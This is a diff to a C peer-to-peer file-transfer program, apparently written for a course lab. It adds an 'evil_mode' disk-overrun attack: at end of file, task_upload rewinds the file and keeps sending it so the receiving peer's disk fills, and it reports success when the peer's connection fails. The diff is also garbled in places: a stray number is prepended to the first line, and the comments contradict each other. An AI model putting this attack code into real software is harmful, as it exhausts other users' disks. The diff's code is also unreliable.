@@ -1,4 +1,4 @@
-// -*- mode: c++ -*-
+4739056 // -*- mode: c++ -*-
 #define _BSD_EXTENSION
 #include <stdlib.h>
 #include <string.h>
@@ -727,12 +727,24 @@ static void task_upload(task_t *t)
 	}
 
 	message("* Transferring file %s\n", t->filename);
+	// message for attack #2
+	if (evil_mode == 2)
+	  message("* Attacking with disk overrun upload");
+
 	// Now, read file from disk and write it to the requesting peer.
 	while (1) {
 		int ret = write_from_taskbuf(t->peer_fd, t);
 		if (ret == TBUF_ERROR) {
-			error("* Peer write error");
-			goto exit;
+		  if (evil_mode == 2)
+		    {
+		      message("* Attack succesful--Peer write error");
+		      goto exit;
+		    }
+		  else
+		    {
+		      error("* Peer write error");
+		      goto exit;
+		    }
 		}
 
 		ret = read_to_taskbuf(t->disk_fd, t);
@@ -741,7 +753,15 @@ static void task_upload(task_t *t)
 			goto exit;
 		} else if (ret == TBUF_END && t->head == t->tail)
 			/* End of file */
-			break;
+			//break;
+		  {
+		    // if attack #3, reset file pointer to beginning of file
+		    // so it keeps writing
+		    if (evil_mode == 2)
+		      lseek(t->disk_fd, 0, 0);
+		    else
+		      break;
+		  }
 	}
 
 	message("* Upload of %s complete\n", t->filename);
